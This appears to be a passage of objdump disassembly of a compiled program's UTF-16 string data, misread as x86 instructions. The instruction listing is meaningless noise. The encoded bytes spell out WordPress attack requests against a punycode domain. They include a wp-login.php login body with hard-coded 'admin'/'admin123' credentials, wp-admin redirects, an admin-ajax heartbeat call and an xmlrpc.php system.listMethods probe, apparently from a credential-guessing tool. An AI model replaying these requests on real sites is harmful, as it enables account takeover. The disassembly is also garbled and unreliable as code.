  40b41a:	00 77 00             	add    %dh,0x0(%edi)
  40b41d:	70 00                	jo     0x40b41f
  40b41f:	2d 00 6c 00 6f       	sub    $0x6f006c00,%eax
  40b424:	00 67 00             	add    %ah,0x0(%edi)
  40b427:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40b42d:	70 00                	jo     0x40b42f
  40b42f:	68 00 70 00 3f       	push   $0x3f007000
  40b434:	00 72 00             	add    %dh,0x0(%edx)
  40b437:	65 00 64 00 69       	add    %ah,%gs:0x69(%eax,%eax,1)
  40b43c:	00 72 00             	add    %dh,0x0(%edx)
  40b43f:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b443:	74 00                	je     0x40b445
  40b445:	5f                   	pop    %edi
  40b446:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b44a:	00 3d 00 68 00 74    	add    %bh,0x74006800
  40b450:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40b454:	00 73 00             	add    %dh,0x0(%ebx)
  40b457:	25 00 33 00 41       	and    $0x41003300,%eax
  40b45c:	00 25 00 32 00 46    	add    %ah,0x46003200
  40b462:	00 25 00 32 00 46    	add    %ah,0x46003200
  40b468:	00 78 00             	add    %bh,0x0(%eax)
  40b46b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b46c:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b472:	00 75 00             	add    %dh,0x0(%ebp)
  40b475:	74 00                	je     0x40b477
  40b477:	6e                   	outsb  %ds:(%esi),(%dx)
  40b478:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b47b:	61                   	popa
  40b47c:	00 2e                	add    %ch,(%esi)
  40b47e:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b482:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b486:	00 79 00             	add    %bh,0x0(%ecx)
  40b489:	25 00 32 00 46       	and    $0x46003200,%eax
  40b48e:	00 77 00             	add    %dh,0x0(%edi)
  40b491:	70 00                	jo     0x40b493
  40b493:	2d 00 61 00 64       	sub    $0x64006100,%eax
  40b498:	00 6d 00             	add    %ch,0x0(%ebp)
  40b49b:	69 00 6e 00 25 00    	imul   $0x25006e,(%eax),%eax
  40b4a1:	32 00                	xor    (%eax),%al
  40b4a3:	46                   	inc    %esi
  40b4a4:	00 26                	add    %ah,(%esi)
  40b4a6:	00 72 00             	add    %dh,0x0(%edx)
  40b4a9:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b4ad:	75 00                	jne    0x40b4af
  40b4af:	74 00                	je     0x40b4b1
  40b4b1:	68 00 3d 00 31       	push   $0x31003d00
  40b4b6:	00 01                	add    %al,(%ecx)
  40b4b8:	80 d7 68             	adc    $0x68,%bh
  40b4bb:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b4bf:	00 70 00             	add    %dh,0x0(%eax)
  40b4c2:	73 00                	jae    0x40b4c4
  40b4c4:	3a 00                	cmp    (%eax),%al
  40b4c6:	2f                   	das
  40b4c7:	00 2f                	add    %ch,(%edi)
  40b4c9:	00 78 00             	add    %bh,0x0(%eax)
  40b4cc:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4cd:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b4d3:	00 75 00             	add    %dh,0x0(%ebp)
  40b4d6:	74 00                	je     0x40b4d8
  40b4d8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4d9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b4dc:	61                   	popa
  40b4dd:	00 2e                	add    %ch,(%esi)
  40b4df:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b4e3:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b4e7:	00 79 00             	add    %bh,0x0(%ecx)
  40b4ea:	2f                   	das
  40b4eb:	00 77 00             	add    %dh,0x0(%edi)
  40b4ee:	70 00                	jo     0x40b4f0
  40b4f0:	2d 00 6c 00 6f       	sub    $0x6f006c00,%eax
  40b4f5:	00 67 00             	add    %ah,0x0(%edi)
  40b4f8:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40b4fe:	70 00                	jo     0x40b500
  40b500:	68 00 70 00 3f       	push   $0x3f007000
  40b505:	00 72 00             	add    %dh,0x0(%edx)
  40b508:	65 00 64 00 69       	add    %ah,%gs:0x69(%eax,%eax,1)
  40b50d:	00 72 00             	add    %dh,0x0(%edx)
  40b510:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b514:	74 00                	je     0x40b516
  40b516:	5f                   	pop    %edi
  40b517:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b51b:	00 3d 00 68 00 74    	add    %bh,0x74006800
  40b521:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40b525:	00 73 00             	add    %dh,0x0(%ebx)
  40b528:	25 00 33 00 41       	and    $0x41003300,%eax
  40b52d:	00 25 00 32 00 46    	add    %ah,0x46003200
  40b533:	00 25 00 32 00 46    	add    %ah,0x46003200
  40b539:	00 77 00             	add    %dh,0x0(%edi)
  40b53c:	77 00                	ja     0x40b53e
  40b53e:	77 00                	ja     0x40b540
  40b540:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40b544:	6e                   	outsb  %ds:(%esi),(%dx)
  40b545:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b54b:	00 75 00             	add    %dh,0x0(%ebp)
  40b54e:	74 00                	je     0x40b550
  40b550:	6e                   	outsb  %ds:(%esi),(%dx)
  40b551:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b554:	61                   	popa
  40b555:	00 2e                	add    %ch,(%esi)
  40b557:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b55b:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b55f:	00 79 00             	add    %bh,0x0(%ecx)
  40b562:	25 00 32 00 46       	and    $0x46003200,%eax
  40b567:	00 77 00             	add    %dh,0x0(%edi)
  40b56a:	70 00                	jo     0x40b56c
  40b56c:	2d 00 61 00 64       	sub    $0x64006100,%eax
  40b571:	00 6d 00             	add    %ch,0x0(%ebp)
  40b574:	69 00 6e 00 25 00    	imul   $0x25006e,(%eax),%eax
  40b57a:	32 00                	xor    (%eax),%al
  40b57c:	46                   	inc    %esi
  40b57d:	00 26                	add    %ah,(%esi)
  40b57f:	00 72 00             	add    %dh,0x0(%edx)
  40b582:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b586:	75 00                	jne    0x40b588
  40b588:	74 00                	je     0x40b58a
  40b58a:	68 00 3d 00 31       	push   $0x31003d00
  40b58f:	00 01                	add    %al,(%ecx)
  40b591:	3b 68 00             	cmp    0x0(%eax),%ebp
  40b594:	74 00                	je     0x40b596
  40b596:	74 00                	je     0x40b598
  40b598:	70 00                	jo     0x40b59a
  40b59a:	73 00                	jae    0x40b59c
  40b59c:	3a 00                	cmp    (%eax),%al
  40b59e:	2f                   	das
  40b59f:	00 2f                	add    %ch,(%edi)
  40b5a1:	00 77 00             	add    %dh,0x0(%edi)
  40b5a4:	77 00                	ja     0x40b5a6
  40b5a6:	77 00                	ja     0x40b5a8
  40b5a8:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40b5ac:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5ad:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b5b3:	00 75 00             	add    %dh,0x0(%ebp)
  40b5b6:	74 00                	je     0x40b5b8
  40b5b8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5b9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b5bc:	61                   	popa
  40b5bd:	00 2e                	add    %ch,(%esi)
  40b5bf:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b5c3:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b5c7:	00 79 00             	add    %bh,0x0(%ecx)
  40b5ca:	2f                   	das
  40b5cb:	00 01                	add    %al,(%ecx)
  40b5cd:	4d                   	dec    %ebp
  40b5ce:	68 00 74 00 74       	push   $0x74007400
  40b5d3:	00 70 00             	add    %dh,0x0(%eax)
  40b5d6:	73 00                	jae    0x40b5d8
  40b5d8:	3a 00                	cmp    (%eax),%al
  40b5da:	2f                   	das
  40b5db:	00 2f                	add    %ch,(%edi)
  40b5dd:	00 77 00             	add    %dh,0x0(%edi)
  40b5e0:	77 00                	ja     0x40b5e2
  40b5e2:	77 00                	ja     0x40b5e4
  40b5e4:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40b5e8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5e9:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b5ef:	00 75 00             	add    %dh,0x0(%ebp)
  40b5f2:	74 00                	je     0x40b5f4
  40b5f4:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5f5:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b5f8:	61                   	popa
  40b5f9:	00 2e                	add    %ch,(%esi)
  40b5fb:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b5ff:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b603:	00 79 00             	add    %bh,0x0(%ecx)
  40b606:	2f                   	das
  40b607:	00 69 00             	add    %ch,0x0(%ecx)
  40b60a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b60b:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b60f:	00 78 00             	add    %bh,0x0(%eax)
  40b612:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40b616:	68 00 70 00 01       	push   $0x1007000
  40b61b:	4d                   	dec    %ebp
  40b61c:	68 00 74 00 74       	push   $0x74007400
  40b621:	00 70 00             	add    %dh,0x0(%eax)
  40b624:	73 00                	jae    0x40b626
  40b626:	3a 00                	cmp    (%eax),%al
  40b628:	2f                   	das
  40b629:	00 2f                	add    %ch,(%edi)
  40b62b:	00 77 00             	add    %dh,0x0(%edi)
  40b62e:	77 00                	ja     0x40b630
  40b630:	77 00                	ja     0x40b632
  40b632:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40b636:	6e                   	outsb  %ds:(%esi),(%dx)
  40b637:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b63d:	00 75 00             	add    %dh,0x0(%ebp)
  40b640:	74 00                	je     0x40b642
  40b642:	6e                   	outsb  %ds:(%esi),(%dx)
  40b643:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b646:	61                   	popa
  40b647:	00 2e                	add    %ch,(%esi)
  40b649:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b64d:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b651:	00 79 00             	add    %bh,0x0(%ecx)
  40b654:	2f                   	das
  40b655:	00 77 00             	add    %dh,0x0(%edi)
  40b658:	70 00                	jo     0x40b65a
  40b65a:	2d 00 61 00 64       	sub    $0x64006100,%eax
  40b65f:	00 6d 00             	add    %ch,0x0(%ebp)
  40b662:	69 00 6e 00 2f 00    	imul   $0x2f006e,(%eax),%eax
  40b668:	01 4b 68             	add    %ecx,0x68(%ebx)
  40b66b:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b66f:	00 70 00             	add    %dh,0x0(%eax)
  40b672:	73 00                	jae    0x40b674
  40b674:	3a 00                	cmp    (%eax),%al
  40b676:	2f                   	das
  40b677:	00 2f                	add    %ch,(%edi)
  40b679:	00 77 00             	add    %dh,0x0(%edi)
  40b67c:	77 00                	ja     0x40b67e
  40b67e:	77 00                	ja     0x40b680
  40b680:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40b684:	6e                   	outsb  %ds:(%esi),(%dx)
  40b685:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b68b:	00 75 00             	add    %dh,0x0(%ebp)
  40b68e:	74 00                	je     0x40b690
  40b690:	6e                   	outsb  %ds:(%esi),(%dx)
  40b691:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b694:	61                   	popa
  40b695:	00 2e                	add    %ch,(%esi)
  40b697:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b69b:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b69f:	00 79 00             	add    %bh,0x0(%ecx)
  40b6a2:	2f                   	das
  40b6a3:	00 77 00             	add    %dh,0x0(%edi)
  40b6a6:	70 00                	jo     0x40b6a8
  40b6a8:	2d 00 6a 00 73       	sub    $0x73006a00,%eax
  40b6ad:	00 6f 00             	add    %ch,0x0(%edi)
  40b6b0:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6b1:	00 2f                	add    %ch,(%edi)
  40b6b3:	00 01                	add    %al,(%ecx)
  40b6b5:	53                   	push   %ebx
  40b6b6:	68 00 74 00 74       	push   $0x74007400
  40b6bb:	00 70 00             	add    %dh,0x0(%eax)
  40b6be:	73 00                	jae    0x40b6c0
  40b6c0:	3a 00                	cmp    (%eax),%al
  40b6c2:	2f                   	das
  40b6c3:	00 2f                	add    %ch,(%edi)
  40b6c5:	00 77 00             	add    %dh,0x0(%edi)
  40b6c8:	77 00                	ja     0x40b6ca
  40b6ca:	77 00                	ja     0x40b6cc
  40b6cc:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40b6d0:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6d1:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b6d7:	00 75 00             	add    %dh,0x0(%ebp)
  40b6da:	74 00                	je     0x40b6dc
  40b6dc:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6dd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b6e0:	61                   	popa
  40b6e1:	00 2e                	add    %ch,(%esi)
  40b6e3:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b6e7:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b6eb:	00 79 00             	add    %bh,0x0(%ecx)
  40b6ee:	2f                   	das
  40b6ef:	00 77 00             	add    %dh,0x0(%edi)
  40b6f2:	70 00                	jo     0x40b6f4
  40b6f4:	2d 00 6c 00 6f       	sub    $0x6f006c00,%eax
  40b6f9:	00 67 00             	add    %ah,0x0(%edi)
  40b6fc:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40b702:	70 00                	jo     0x40b704
  40b704:	68 00 70 00 01       	push   $0x1007000
  40b709:	80 db 6c             	sbb    $0x6c,%bl
  40b70c:	00 6f 00             	add    %ch,0x0(%edi)
  40b70f:	67 00 3d             	add    %bh,(%di)
  40b712:	00 61 00             	add    %ah,0x0(%ecx)
  40b715:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40b719:	69 00 6e 00 26 00    	imul   $0x26006e,(%eax),%eax
  40b71f:	70 00                	jo     0x40b721
  40b721:	77 00                	ja     0x40b723
  40b723:	64 00 3d 00 61 00 64 	add    %bh,%fs:0x64006100
  40b72a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b72d:	69 00 6e 00 31 00    	imul   $0x31006e,(%eax),%eax
  40b733:	32 00                	xor    (%eax),%al
  40b735:	33 00                	xor    (%eax),%eax
  40b737:	26 00 77 00          	add    %dh,%es:0x0(%edi)
  40b73b:	70 00                	jo     0x40b73d
  40b73d:	2d 00 73 00 75       	sub    $0x75007300,%eax
  40b742:	00 62 00             	add    %ah,0x0(%edx)
  40b745:	6d                   	insl   (%dx),%es:(%edi)
  40b746:	00 69 00             	add    %ch,0x0(%ecx)
  40b749:	74 00                	je     0x40b74b
  40b74b:	3d 00 4c 00 6f       	cmp    $0x6f004c00,%eax
  40b750:	00 67 00             	add    %ah,0x0(%edi)
  40b753:	2b 00                	sub    (%eax),%eax
  40b755:	49                   	dec    %ecx
  40b756:	00 6e 00             	add    %ch,0x0(%esi)
  40b759:	26 00 72 00          	add    %dh,%es:0x0(%edx)
  40b75d:	65 00 64 00 69       	add    %ah,%gs:0x69(%eax,%eax,1)
  40b762:	00 72 00             	add    %dh,0x0(%edx)
  40b765:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b769:	74 00                	je     0x40b76b
  40b76b:	5f                   	pop    %edi
  40b76c:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b770:	00 3d 00 68 00 74    	add    %bh,0x74006800
  40b776:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40b77a:	00 73 00             	add    %dh,0x0(%ebx)
  40b77d:	25 00 33 00 41       	and    $0x41003300,%eax
  40b782:	00 25 00 32 00 46    	add    %ah,0x46003200
  40b788:	00 25 00 32 00 46    	add    %ah,0x46003200
  40b78e:	00 78 00             	add    %bh,0x0(%eax)
  40b791:	6e                   	outsb  %ds:(%esi),(%dx)
  40b792:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b798:	00 75 00             	add    %dh,0x0(%ebp)
  40b79b:	74 00                	je     0x40b79d
  40b79d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b79e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b7a1:	61                   	popa
  40b7a2:	00 2e                	add    %ch,(%esi)
  40b7a4:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b7a8:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b7ac:	00 79 00             	add    %bh,0x0(%ecx)
  40b7af:	25 00 32 00 46       	and    $0x46003200,%eax
  40b7b4:	00 77 00             	add    %dh,0x0(%edi)
  40b7b7:	70 00                	jo     0x40b7b9
  40b7b9:	2d 00 61 00 64       	sub    $0x64006100,%eax
  40b7be:	00 6d 00             	add    %ch,0x0(%ebp)
  40b7c1:	69 00 6e 00 25 00    	imul   $0x25006e,(%eax),%eax
  40b7c7:	32 00                	xor    (%eax),%al
  40b7c9:	46                   	inc    %esi
  40b7ca:	00 26                	add    %ah,(%esi)
  40b7cc:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b7d0:	00 73 00             	add    %dh,0x0(%ebx)
  40b7d3:	74 00                	je     0x40b7d5
  40b7d5:	63 00                	arpl   %eax,(%eax)
  40b7d7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7d8:	00 6f 00             	add    %ch,0x0(%edi)
  40b7db:	6b 00 69             	imul   $0x69,(%eax),%eax
  40b7de:	00 65 00             	add    %ah,0x0(%ebp)
  40b7e1:	3d 00 31 00 01       	cmp    $0x1003100,%eax
  40b7e6:	4f                   	dec    %edi
  40b7e7:	6c                   	insb   (%dx),%es:(%edi)
  40b7e8:	00 6f 00             	add    %ch,0x0(%edi)
  40b7eb:	67 00 3d             	add    %bh,(%di)
  40b7ee:	00 61 00             	add    %ah,0x0(%ecx)
  40b7f1:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40b7f5:	69 00 6e 00 26 00    	imul   $0x26006e,(%eax),%eax
  40b7fb:	70 00                	jo     0x40b7fd
  40b7fd:	77 00                	ja     0x40b7ff
  40b7ff:	64 00 3d 00 61 00 64 	add    %bh,%fs:0x64006100
  40b806:	00 6d 00             	add    %ch,0x0(%ebp)
  40b809:	69 00 6e 00 31 00    	imul   $0x31006e,(%eax),%eax
  40b80f:	32 00                	xor    (%eax),%al
  40b811:	33 00                	xor    (%eax),%eax
  40b813:	26 00 77 00          	add    %dh,%es:0x0(%edi)
  40b817:	70 00                	jo     0x40b819
  40b819:	2d 00 73 00 75       	sub    $0x75007300,%eax
  40b81e:	00 62 00             	add    %ah,0x0(%edx)
  40b821:	6d                   	insl   (%dx),%es:(%edi)
  40b822:	00 69 00             	add    %ch,0x0(%ecx)
  40b825:	74 00                	je     0x40b827
  40b827:	3d 00 4c 00 6f       	cmp    $0x6f004c00,%eax
  40b82c:	00 67 00             	add    %ah,0x0(%edi)
  40b82f:	2b 00                	sub    (%eax),%eax
  40b831:	49                   	dec    %ecx
  40b832:	00 6e 00             	add    %ch,0x0(%esi)
  40b835:	01 61 68             	add    %esp,0x68(%ecx)
  40b838:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b83c:	00 70 00             	add    %dh,0x0(%eax)
  40b83f:	73 00                	jae    0x40b841
  40b841:	3a 00                	cmp    (%eax),%al
  40b843:	2f                   	das
  40b844:	00 2f                	add    %ch,(%edi)
  40b846:	00 78 00             	add    %bh,0x0(%eax)
  40b849:	6e                   	outsb  %ds:(%esi),(%dx)
  40b84a:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b850:	00 75 00             	add    %dh,0x0(%ebp)
  40b853:	74 00                	je     0x40b855
  40b855:	6e                   	outsb  %ds:(%esi),(%dx)
  40b856:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b859:	61                   	popa
  40b85a:	00 2e                	add    %ch,(%esi)
  40b85c:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b860:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b864:	00 79 00             	add    %bh,0x0(%ecx)
  40b867:	2f                   	das
  40b868:	00 77 00             	add    %dh,0x0(%edi)
  40b86b:	70 00                	jo     0x40b86d
  40b86d:	2d 00 61 00 64       	sub    $0x64006100,%eax
  40b872:	00 6d 00             	add    %ch,0x0(%ebp)
  40b875:	69 00 6e 00 2f 00    	imul   $0x2f006e,(%eax),%eax
  40b87b:	61                   	popa
  40b87c:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40b880:	00 69 00             	add    %ch,0x0(%ecx)
  40b883:	6e                   	outsb  %ds:(%esi),(%dx)
  40b884:	00 2d 00 61 00 6a    	add    %ch,0x6a006100
  40b88a:	00 61 00             	add    %ah,0x0(%ecx)
  40b88d:	78 00                	js     0x40b88f
  40b88f:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40b893:	68 00 70 00 01       	push   $0x1007000
  40b898:	49                   	dec    %ecx
  40b899:	61                   	popa
  40b89a:	00 63 00             	add    %ah,0x0(%ebx)
  40b89d:	74 00                	je     0x40b89f
  40b89f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b8a5:	3d 00 68 00 65       	cmp    $0x65006800,%eax
  40b8aa:	00 61 00             	add    %ah,0x0(%ecx)
  40b8ad:	72 00                	jb     0x40b8af
  40b8af:	74 00                	je     0x40b8b1
  40b8b1:	62 00                	bound  %eax,(%eax)
  40b8b3:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b8b7:	74 00                	je     0x40b8b9
  40b8b9:	26 00 64 00 61       	add    %ah,%es:0x61(%eax,%eax,1)
  40b8be:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b8c2:	00 3d 00 7b 00 22    	add    %bh,0x22007b00
  40b8c8:	00 63 00             	add    %ah,0x0(%ebx)
  40b8cb:	6c                   	insb   (%dx),%es:(%edi)
  40b8cc:	00 69 00             	add    %ch,0x0(%ecx)
  40b8cf:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b8d3:	74 00                	je     0x40b8d5
  40b8d5:	22 00                	and    (%eax),%al
  40b8d7:	3a 00                	cmp    (%eax),%al
  40b8d9:	22 00                	and    (%eax),%al
  40b8db:	31 00                	xor    %eax,(%eax)
  40b8dd:	22 00                	and    (%eax),%al
  40b8df:	7d 00                	jge    0x40b8e1
  40b8e1:	00 47 68             	add    %al,0x68(%edi)
  40b8e4:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b8e8:	00 70 00             	add    %dh,0x0(%eax)
  40b8eb:	73 00                	jae    0x40b8ed
  40b8ed:	3a 00                	cmp    (%eax),%al
  40b8ef:	2f                   	das
  40b8f0:	00 2f                	add    %ch,(%edi)
  40b8f2:	00 78 00             	add    %bh,0x0(%eax)
  40b8f5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8f6:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40b8fc:	00 75 00             	add    %dh,0x0(%ebp)
  40b8ff:	74 00                	je     0x40b901
  40b901:	6e                   	outsb  %ds:(%esi),(%dx)
  40b902:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b905:	61                   	popa
  40b906:	00 2e                	add    %ch,(%esi)
  40b908:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40b90c:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40b910:	00 79 00             	add    %bh,0x0(%ecx)
  40b913:	2f                   	das
  40b914:	00 78 00             	add    %bh,0x0(%eax)
  40b917:	6d                   	insl   (%dx),%es:(%edi)
  40b918:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40b91c:	00 70 00             	add    %dh,0x0(%eax)
  40b91f:	63 00                	arpl   %eax,(%eax)
  40b921:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40b925:	68 00 70 00 01       	push   $0x1007000
  40b92a:	80 b3 3c 00 3f 00 78 	xorb   $0x78,0x3f003c(%ebx)
  40b931:	00 6d 00             	add    %ch,0x0(%ebp)
  40b934:	6c                   	insb   (%dx),%es:(%edi)
  40b935:	00 20                	add    %ah,(%eax)
  40b937:	00 76 00             	add    %dh,0x0(%esi)
  40b93a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b93e:	73 00                	jae    0x40b940
  40b940:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b946:	3d 00 22 00 31       	cmp    $0x31002200,%eax
  40b94b:	00 2e                	add    %ch,(%esi)
  40b94d:	00 30                	add    %dh,(%eax)
  40b94f:	00 22                	add    %ah,(%edx)
  40b951:	00 3f                	add    %bh,(%edi)
  40b953:	00 3e                	add    %bh,(%esi)
  40b955:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b958:	6d                   	insl   (%dx),%es:(%edi)
  40b959:	00 65 00             	add    %ah,0x0(%ebp)
  40b95c:	74 00                	je     0x40b95e
  40b95e:	68 00 6f 00 64       	push   $0x64006f00
  40b963:	00 43 00             	add    %al,0x0(%ebx)
  40b966:	61                   	popa
  40b967:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40b96b:	00 3e                	add    %bh,(%esi)
  40b96d:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b970:	6d                   	insl   (%dx),%es:(%edi)
  40b971:	00 65 00             	add    %ah,0x0(%ebp)
  40b974:	74 00                	je     0x40b976
  40b976:	68 00 6f 00 64       	push   $0x64006f00
  40b97b:	00 4e 00             	add    %cl,0x0(%esi)
  40b97e:	61                   	popa
  40b97f:	00 6d 00             	add    %ch,0x0(%ebp)
  40b982:	65 00 3e             	add    %bh,%gs:(%esi)
  40b985:	00 73 00             	add    %dh,0x0(%ebx)
  40b988:	79 00                	jns    0x40b98a
  40b98a:	73 00                	jae    0x40b98c
  40b98c:	74 00                	je     0x40b98e
  40b98e:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b992:	2e 00 6c 00 69       	add    %ch,%cs:0x69(%eax,%eax,1)
  40b997:	00 73 00             	add    %dh,0x0(%ebx)
  40b99a:	74 00                	je     0x40b99c
  40b99c:	4d                   	dec    %ebp
  40b99d:	00 65 00             	add    %ah,0x0(%ebp)
  40b9a0:	74 00                	je     0x40b9a2
  40b9a2:	68 00 6f 00 64       	push   $0x64006f00
  40b9a7:	00 73 00             	add    %dh,0x0(%ebx)
  40b9aa:	3c 00                	cmp    $0x0,%al
  40b9ac:	2f                   	das
  40b9ad:	00 6d 00             	add    %ch,0x0(%ebp)
  40b9b0:	65 00 74 00 68       	add    %dh,%gs:0x68(%eax,%eax,1)
  40b9b5:	00 6f 00             	add    %ch,0x0(%edi)
  40b9b8:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40b9bc:	61                   	popa
  40b9bd:	00 6d 00             	add    %ch,0x0(%ebp)
  40b9c0:	65 00 3e             	add    %bh,%gs:(%esi)
  40b9c3:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40b9c6:	2f                   	das
  40b9c7:	00 6d 00             	add    %ch,0x0(%ebp)
  40b9ca:	65 00 74 00 68       	add    %dh,%gs:0x68(%eax,%eax,1)
  40b9cf:	00 6f 00             	add    %ch,0x0(%edi)
  40b9d2:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40b9d6:	61                   	popa
  40b9d7:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40b9db:	00 3e                	add    %bh,(%esi)
  40b9dd:	00 00                	add    %al,(%eax)
  40b9df:	4f                   	dec    %edi
  40b9e0:	68 00 74 00 74       	push   $0x74007400
  40b9e5:	00 70 00             	add    %dh,0x0(%eax)
  40b9e8:	73 00                	jae    0x40b9ea
  40b9ea:	3a 00                	cmp    (%eax),%al
  40b9ec:	2f                   	das
  40b9ed:	00 2f                	add    %ch,(%edi)
  40b9ef:	00 77 00             	add    %dh,0x0(%edi)
  40b9f2:	77 00                	ja     0x40b9f4
  40b9f4:	77 00                	ja     0x40b9f6
  40b9f6:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  40b9fa:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9fb:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40ba01:	00 75 00             	add    %dh,0x0(%ebp)
  40ba04:	74 00                	je     0x40ba06
  40ba06:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba07:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba0a:	61                   	popa
  40ba0b:	00 2e                	add    %ch,(%esi)
  40ba0d:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40ba11:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40ba15:	00 79 00             	add    %bh,0x0(%ecx)
  40ba18:	2f                   	das
  40ba19:	00 78 00             	add    %bh,0x0(%eax)
  40ba1c:	6d                   	insl   (%dx),%es:(%edi)
